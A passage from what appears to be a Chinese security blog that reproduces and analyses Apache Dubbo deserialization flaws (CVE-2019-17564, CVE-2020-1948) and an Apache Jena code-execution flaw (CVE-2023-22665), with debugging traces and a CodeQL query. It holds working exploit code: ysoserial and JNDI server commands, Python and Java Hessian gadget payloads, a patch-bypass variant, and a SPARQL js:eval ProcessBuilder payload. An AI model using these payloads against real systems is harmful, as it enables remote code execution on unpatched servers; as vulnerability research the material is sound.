<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>启动HttpProvider一直报错我就修改了http-provider.xml中配置的端口</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">&quot;http&quot;</span> <span class="attr">id</span>=<span class="string">&quot;http&quot;</span> <span class="attr">port</span>=<span class="string">&quot;80&quot;</span> <span class="attr">server</span>=<span class="string">&quot;$&#123;servlet.container:tomcat&#125;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<p>然后启动依次启动zookeeper，HttpProvider</p>
<p>向 <code>/org.apache.dubbo.samples.http.api.DemoService</code> POST ysoserial生成的POC</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span> &gt; /tmp/payload.ser</span><br></pre></td></tr></table></figure>

<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200804162732445.png" alt="image-20200804162732445"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>由报错信息，入口点在<code>HttpServlet.service</code></p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200804163631409.png" alt="image-20200804163631409"></p>
<p>在<code>javax.servlet.http.HttpServlet#service(javax.servlet.ServletRequest, javax.servlet.ServletResponse)</code>下断点进行跟踪</p>
<p>进入到<code>org.apache.dubbo.remoting.http.servlet.DispatcherServlet#service</code></p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200804181216449.png" alt="image-20200804181216449"></p>
<p>如果handler对象不等于null，就调用handle方法处理</p>
<p>查看handle方法Implementation</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200804181403679.png" alt="image-20200804181403679"></p>
<p>Dubbo支持这几种协议来进行数据的传输交互，而本次处理HTTP协议的进入到<code>org.apache.dubbo.rpc.protocol.http.HttpProtocol</code></p>
<p>org.apache.dubbo.rpc.protocol.http.HttpProtocol.InternalHandler#handle</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200804191923854.png" alt="image-20200804191923854"></p>
<p>跟进<code>skeleton.handleRequest</code>之后调用的是 spring 的 HttpInvoker</p>
<p>Spring HttpInvoker是一个新的远程调用模型，作为Spring框架的一部分，执行基于HTTP的远程调用（意味着可以通过防火墙），并使用Java的序列化机制在网络间传递对象。</p>
<p><a href="https://docs.spring.io/spring/docs/5.1.0.RELEASE/spring-framework-reference/integration.html#remoting-httpinvoker">官方文档</a>也提示可能存在Java反序列化漏洞</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200808144522824.png" alt="image-20200808144522824"></p>
<p>最后反序列化点在org.springframework.remoting.rmi.RemoteInvocationSerializingExporter#doReadRemoteInvocation</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200808134558804.png" alt="image-20200808134558804"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>跟踪Dubbo 2.7.7的代码，到org.apache.dubbo.rpc.protocol.http.HttpProtocol.InternalHandler#handle</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200808152014321.png" alt="image-20200808152014321"></p>
<p>skeleton是一个JsonRpcServer对象，然后进入<code>skeleton.handle</code></p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200808152641529.png" alt="image-20200808152641529"></p>
<p><code>skeleton.handle</code>当中没办法处理我们传输Java序列化字节流，因此就会抛出异常，也就是说这里的<code>org.apache.dubbo.rpc.protocol.http.HttpProtocol</code>后续处理不是通过Spring HttpInvoker了，而是通过 JsonRpc</p>
<h2 id="CVE-2020-1948"><a href="#CVE-2020-1948" class="headerlink" title="CVE-2020-1948"></a>CVE-2020-1948</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>Apache Dubbo 2.7.0 ~ 2.7.6</li>
<li>Apache Dubbo 2.6.0 ~ 2.6.7</li>
<li>Apache Dubbo 2.5.x 所有版本 (官方不再提供支持)</li>
</ul>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>以文首创建的Dubbo项目为例，在provider中添加rome作为JNDI注入的gadget，这里使用marshalsec中的rome gadget是因为Dubbo协议默认采用Hessian作为反序列化方式，在Hessian中，ysoserial提供的gadget无法使用，具体可见<a href="https://blog.csdn.net/u011721501/article/details/79443598">Java Unmarshalling Security - 攻击Hessian协议</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>用<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>起一个服务端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span> -A 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200827142408413.png" alt="image-20200827142408413"></p>
<p>运行以下POC</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pip3 install dubbo-py</span></span><br><span class="line"><span class="keyword">from</span> dubbo.codec.hessian2 <span class="keyword">import</span> Decoder,new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"></span><br><span class="line">client = DubboClient(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">20880</span>)</span><br><span class="line"></span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">    <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">    dataSource=<span class="string">&quot;ldap://127.0.0.1:1389/svtwih&quot;</span>,</span><br><span class="line">    strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">    )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">    <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">    name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">    <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">    beanClass=JdbcRowSetImplClass,</span><br><span class="line">    obj=JdbcRowSetImpl</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;cn.rui0&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;rce&#x27;</span>,</span><br><span class="line">    args=[toStringBean])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure>

<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200827142737198.png" alt="image-20200827142737198"></p>
<p>如果JNDI服务端正常收到请求但是并未成功执行命令注意下JDK版本：在JDK 6u132, JDK 7u122, JDK 8u113 中限制了Naming&#x2F;Directory服务中JNDI Reference远程加载Object Factory类的特性，系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，不过在JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false</p>
<p>以上POC也可借助marshalsec生成</p>
<p>在consumer中添加marshalsec-0.0.3-SNAPSHOT-all.jar，代码更改为以下，其中RPC远程调用的方法并不需要服务端真实存在</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DemoService</span> &#123;</span><br><span class="line">    String <span class="title function_">anything</span><span class="params">(Object name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;classpath:consumer.xml&quot;</span>&#125;);</span><br><span class="line">        context.start();</span><br><span class="line">        <span class="comment">// Obtaining a remote service proxy</span></span><br><span class="line">        <span class="type">DemoService</span> <span class="variable">demoService</span> <span class="operator">=</span> (DemoService)context.getBean(<span class="string">&quot;demoService&quot;</span>);</span><br><span class="line">        <span class="comment">// Executing remote methods</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">hello</span> <span class="operator">=</span> demoService.anything(getPayload());</span><br><span class="line">        <span class="comment">// Display the call result</span></span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/svtwih&quot;</span>;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">item</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(jndiUrl));</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,item);</span><br><span class="line">        <span class="keyword">return</span> JDKUtil.makeMap(root,root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200827144626837.png" alt="image-20200827144626837"></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>调试前最好关闭<code>Enable &#39;toString()&#39; object view</code>，否则漏洞会提前自动触发</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200828164030703.png" alt="image-20200828164030703"></p>
<p>一开始参考网上前辈的文章，却发现自己debug跟踪代码执行的流程不太一样，后来发现是因为参考文章中给接口添加了一个参数为Object类型的方法，并在provider实现后，使用comsumer携带恶意参数去远程调用这个真实存在的方法</p>
<p>漏洞原作者的POC，使用的是任意不存在的service和method，导致Dubbo找不到注册的service而抛出异常，在抛出异常的时候触发漏洞</p>
<p>所以有两种触发方法</p>
<ol>
<li>在刚传入序列化值时依赖Rome的toString方法通过构造HashMap触发key的hashCode实现反序列化</li>
<li>反序列化执行完成后，利用RemotingException抛出异常输出时隐式调用了Rome的toString方法导致RCE</li>
</ol>
<p>未找到service而抛出异常的位置在<code>org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol#getInvoker</code></p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200828170632439.png" alt="image-20200828170632439"></p>
<p>其中inv是DecodeableRpcInvocation的实例对象，在这里会默认调用其toString方法，具体实现在其父类RpcInvocation，下一个断点跳过去</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200828171644181.png" alt="image-20200828171644181"></p>
<p>可见其中的argements就是ToStringBean的实例，跟入<code>Arrays.toString(arguments)</code></p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200828171857376.png" alt="image-20200828171857376"></p>
<p> 最终是到了ToStringBean的toString方法</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200828171920387.png" alt="image-20200828171920387"></p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200828172546108.png" alt="image-20200828172546108"></p>
<p>在ToStringBean实现的toString方法中，会遍历传入对象的所有方法（Method对象），并且通过java实现的invoke方法动态调用传入对象的所有Method对象，当此处for循环执行到JdbcRowSetImpl类中getDatabaseMetData函数时候，会调用函数内connect方法，导致执行JdbcRowSetImpl的执行链，导致代码执行</p>
<h3 id="补丁绕过"><a href="#补丁绕过" class="headerlink" title="补丁绕过"></a>补丁绕过</h3><p>在2.7.7版本，<code>org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)</code>中增加了一个判断，限制了RPC的方法名，不是指定方法的话会抛出异常</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200828152908053.png" alt="image-20200828152908053"></p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200828152938398.png" alt="image-20200828152938398"></p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200828153012955.png" alt="image-20200828153012955"></p>
<p>但方法名我们可控，在脚本中修改方法名为<code>$invoke</code>，<code>$invokeAsync</code>，<code>$echo</code>其中任意一个即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pip3 install dubbo-py</span></span><br><span class="line"><span class="keyword">from</span> dubbo.codec.hessian2 <span class="keyword">import</span> Decoder,new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"></span><br><span class="line">client = DubboClient(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">20880</span>)</span><br><span class="line"></span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">    <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">    dataSource=<span class="string">&quot;ldap://127.0.0.1:1389/fkeuiv&quot;</span>,</span><br><span class="line">    strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">    )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">    <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">    name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">    <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">    beanClass=JdbcRowSetImplClass,</span><br><span class="line">    obj=JdbcRowSetImpl</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;cn.rui0&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;$echo&#x27;</span>,</span><br><span class="line">    args=[toStringBean])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure>



<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>参考<a href="https://www.sevenyuan.cn/2020/07/21/java/2020-07-21-dubbo-cve-2020-1948/">Dubbo 漏洞 CVE-2020-1948 复现+简单修复</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://dubbo.apache.org/zh-cn/docs/user/quick-start.html">http://dubbo.apache.org/zh-cn/docs/user/quick-start.html</a></p>
<p><a href="http://www.lmxspace.com/2020/02/16/Apache-Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/">Apache Dubbo反序列化漏洞（CVE-2019-17564）</a></p>
<p>[<a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06225.html">CVE-2019-17564] Apache Dubbo deserialization vulnerability</a></p>
<p><a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html">[CVE-2020-1948] Apache Dubbo Provider default deserialization cause RCE</a></p>
<p><a href="https://blog.csdn.net/u011721501/article/details/79443598">Java Unmarshalling Security - 攻击Hessian协议</a></p>
<p><a href="https://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Java Hessian反序列化漏洞</a></p>
<p><a href="https://paper.seebug.org/1131/">Hessian 反序列化及相关利用链</a></p>
<p><a href="https://www.anquanke.com/post/id/209251">CVE-2020-1948 Apache Dubbo Hessian 反序列化漏洞分析</a></p>
<p><a href="https://paper.seebug.org/1264/">Dubbo 漏洞 CVE-2020-1948 分析</a></p>
<p><a href="https://www.sevenyuan.cn/2020/07/21/java/2020-07-21-dubbo-cve-2020-1948/">Dubbo 漏洞 CVE-2020-1948 复现+简单修复</a></p>
]]></content>
      <tags>
        <tag>Dubbo</tag>
        <tag>Java反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Jena 代码执行漏洞(CVE-2023-22665)</title>
    <url>/2023/05/05/Apache-Jena-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2023-22665/</url>
    <content><![CDATA[<p>ARQ是Jena的一个查询引擎，它支持SPARQLRDF查询语言，同时也支持JavaScript。当Jena应用的SPARQL语句被外部可控时，将会造成任意代码执行漏洞。</p>
<span id="more"></span>

<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
<li>Apache Jena &lt;&#x3D; 4.7.0</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.jena<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>apache-jena<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.jena.query.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.jena.rdf.model.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApacheJenaTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">queryString</span> <span class="operator">=</span> <span class="string">&quot;PREFIX js: &lt;http://jena.apache.org/ARQ/jsFunction#&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;SELECT js:eval(\&quot;new java.lang.ProcessBuilder(\\\&quot;open\\\&quot;, \\\&quot;-a\\\&quot;, \\\&quot;calculator\\\&quot;).start()\&quot;) &#123;&#125;&quot;</span> ;</span><br><span class="line"></span><br><span class="line">        <span class="type">Model</span> <span class="variable">model</span> <span class="operator">=</span> ModelFactory.createDefaultModel();</span><br><span class="line">        <span class="type">QueryExecution</span> <span class="variable">qexec</span> <span class="operator">=</span> QueryExecutionFactory.create(queryString, model);</span><br><span class="line">        qexec.execSelect().next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="挖掘过程"><a href="#挖掘过程" class="headerlink" title="挖掘过程"></a>挖掘过程</h2><p>在分析<a href="/2022/12/17/%E7%94%A8CodeQL%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E-CVE-2022-42889/">CVE-2022-42889</a>的时候，就觉得这种类型的漏洞应该比较普遍，所以写了对应的CodeQL规则，批量的扫了一些开源项目</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class PublicMethodParameter extends DataFlow::Node &#123;</span><br><span class="line">  PublicMethodParameter() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> m, <span class="keyword">Parameter</span> p <span class="operator">|</span></span><br><span class="line">      m.getDeclaringType().isPublic() <span class="keyword">and</span></span><br><span class="line">      m.isPublic() <span class="keyword">and</span></span><br><span class="line">      p <span class="operator">=</span> m.getAParameter() <span class="keyword">and</span></span><br><span class="line">      p.getType().hasName(&quot;String&quot;) <span class="keyword">and</span></span><br><span class="line">      this.asParameter() <span class="operator">=</span> p</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ScriptEngineSink extends DataFlow::Node &#123;</span><br><span class="line">  ScriptEngineSink() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(MethodAccess ma, Interface i <span class="operator">|</span></span><br><span class="line">      this.asExpr() <span class="operator">=</span> ma.getAnArgument() <span class="keyword">and</span></span><br><span class="line">      ma.getCallee().getDeclaringType().getASupertype<span class="operator">*</span>() <span class="operator">=</span> i <span class="keyword">and</span></span><br><span class="line">      (</span><br><span class="line">        i.hasQualifiedName(&quot;javax.script&quot;, &quot;Invocable&quot;) <span class="keyword">and</span></span><br><span class="line">        (</span><br><span class="line">          ma.getCallee().hasName(&quot;invokeFunction&quot;) <span class="keyword">or</span></span><br><span class="line">          ma.getCallee().hasName(&quot;invokeMethod&quot;)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">or</span></span><br><span class="line">        i.hasQualifiedName(&quot;javax.script&quot;, &quot;Compilable&quot;) <span class="keyword">and</span></span><br><span class="line">        ma.getCallee().hasName(&quot;compile&quot;)</span><br><span class="line">        <span class="keyword">or</span></span><br><span class="line">        i.hasQualifiedName(&quot;javax.script&quot;, &quot;ScriptEngine&quot;) <span class="keyword">and</span></span><br><span class="line">        ma.getCallee().hasName(&quot;eval&quot;)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  TaintTrackingConfig() &#123; this <span class="operator">=</span> &quot;TaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof PublicMethodParameter &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123; sink instanceof ScriptEngineSink &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink,</span><br><span class="line">  &quot;Source: &quot; <span class="operator">+</span> source.getNode().asParameter().getCallable().getDeclaringType() <span class="operator">+</span> &quot;.&quot; <span class="operator">+</span></span><br><span class="line">    source.getNode().asParameter().getCallable()</span><br></pre></td></tr></table></figure>

<p>扫出来的结果也不能直接视为漏洞，只是可能存在类似漏洞，可以作为参考，然后我根据官方文档<a href="https://jena.apache.org/documentation/query/javascript-functions.html">Apache Jena - ARQ - JavaScript SPARQL Functions</a>，即可得到POC，调用栈如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">invokeFunction:197, NashornScriptEngine (jdk.nashorn.api.scripting)</span><br><span class="line">exec:102, ScriptFunction (org.apache.jena.sparql.function.scripting)</span><br><span class="line">exec:64, FunctionBase (org.apache.jena.sparql.function)</span><br><span class="line">exec:47, FunctionBase (org.apache.jena.sparql.function)</span><br><span class="line">evalSpecial:69, E_Function (org.apache.jena.sparql.expr)</span><br><span class="line">eval:100, ExprFunctionN (org.apache.jena.sparql.expr)</span><br><span class="line">get:114, VarExprList (org.apache.jena.sparql.core)</span><br><span class="line">accept:64, QueryIterAssign (org.apache.jena.sparql.engine.iterator)</span><br><span class="line">hasNextBinding:81, QueryIterProcessBinding (org.apache.jena.sparql.engine.iterator)</span><br><span class="line">hasNext:116, QueryIteratorBase (org.apache.jena.sparql.engine.iterator)</span><br><span class="line">hasNextBinding:58, QueryIterConvert (org.apache.jena.sparql.engine.iterator)</span><br><span class="line">hasNext:116, QueryIteratorBase (org.apache.jena.sparql.engine.iterator)</span><br><span class="line">hasNextBinding:38, QueryIteratorWrapper 